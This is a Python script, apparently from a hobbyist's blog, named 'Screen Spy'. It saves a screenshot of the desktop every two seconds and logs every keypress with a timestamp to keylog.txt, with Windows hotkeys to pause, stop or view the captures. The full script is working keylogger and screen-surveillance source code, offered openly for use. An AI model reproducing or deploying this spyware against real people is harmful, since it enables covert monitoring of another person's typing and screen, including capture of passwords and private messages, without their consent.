"""Screen Spy V1.93.
   By Steve Shambles July 2019.
   Updated december 2019.
   https://stevepython.wordpress.com

pip3 install pyscreeze
pip3 install pynput
pip3 install keyboard

Note: hotkeys only work on Windows platform at moment:
-----------------
pause screenshots: Shift+Ctrl+1, then again to resume.
View images folder live: Shift+Ctrl+3
Stop taking screenshots:  Shift+Ctrl+2
"""
from datetime import datetime
import logging
import os
import subprocess
import sys
import threading

import pyscreeze
import keyboard as kb
from pynput.keyboard import Listener


class Glo:
    """global store, this makes all these variables global, use glo.var"""
    sys_platform = ''
    save_folder = 'screens/'
    save_on = True
    stop_thread = False
    file_name = ''
    file_inc = 0
    image_count = 0
    grab_secs = 2
    max_images = 7200

def what_platform():
    """Determine system platform."""
    if sys.platform.startswith('win'):
        Glo.sys_platform = 'windows'

    elif sys.platform.startswith('linux'):
        Glo.sys_platform = 'linux'

    elif sys.platform.startswith('darwin'):
        Glo.sys_platform = 'mac'

def chk_fold():
    """Check a save folder exists, if not create one."""
    check_folder = os.path.isdir(Glo.save_folder)
    if not check_folder:
        os.mkdir(Glo.save_folder)

def view_images():
    """Opens file viewer in saved image folder, when Shift+Ctrl+3 pressed."""
    if Glo.sys_platform == 'windows':
        cwd = Glo.save_folder
        subprocess.Popen(['C:/Windows/explorer.exe', cwd.replace('/', '\\')])
        return

    # For future use, when hotkeys for linux fixed
    if Glo.sys_platform == 'linux':
        subprocess.call(['xdg-open', Glo.save_folder])
        return

    # mac view images would go here, if I knew how to do it.
    return

def toggle_save():
    """Toggles save an image or not when Shift+Ctrl+1 pressed."""
    Glo.save_on = not Glo.save_on

def thread_stop():
    """Stops thread when Shift+Ctrl+2 pressed and tries to exit."""
    Glo.stop_thread = not Glo.stop_thread
    sys.exit()

def check_file_exists():
    """If about to overwrite a file create a new folder using
       a unique timestamp and use that instead."""
    check_overwrite = os.path.isfile(Glo.save_folder+str(Glo.file_name))
    if check_overwrite:
        time_stamp = (datetime.now().strftime(r'%y%m%d%H%M%S/'))
        new_folder = (time_stamp)
        os.mkdir(new_folder)
        Glo.save_folder = new_folder

def grab_screen():
    """Grab image of the current desktop and save it."""
    Glo.file_inc += 1
    Glo.file_name = str(Glo.file_inc)+'-screenshot.jpg'

    if Glo.save_on and Glo.image_count < Glo.max_images:
        check_file_exists()
        pyscreeze.screenshot(Glo.save_folder+str(Glo.file_name))
        Glo.image_count += 1

    if not Glo.stop_thread:
        threading.Timer(Glo.grab_secs, grab_screen).start()

def keypress(Key):
    """key logger."""
    logging.info(str(Key))


# had to omit hotkey use from linux version for now.
if  not sys.platform.startswith('linux'):
    hotkey_pause = 'Shift+Ctrl+1'
    kb.add_hotkey(hotkey_pause, toggle_save, args=None)

    hotkey_stop = 'Shift+Ctrl+2'
    kb.add_hotkey(hotkey_stop, thread_stop, args=None)

    hotkey_view = 'Shift+Ctrl+3'
    kb.add_hotkey(hotkey_view, view_images, args=None)

# Start
logging.basicConfig(filename=('keylog.txt'),
                    level=logging.DEBUG, format='%(asctime)s : %(message)s')

what_platform()
chk_fold()
grab_screen()

with Listener(on_press=keypress) as listener:
    listener.join()
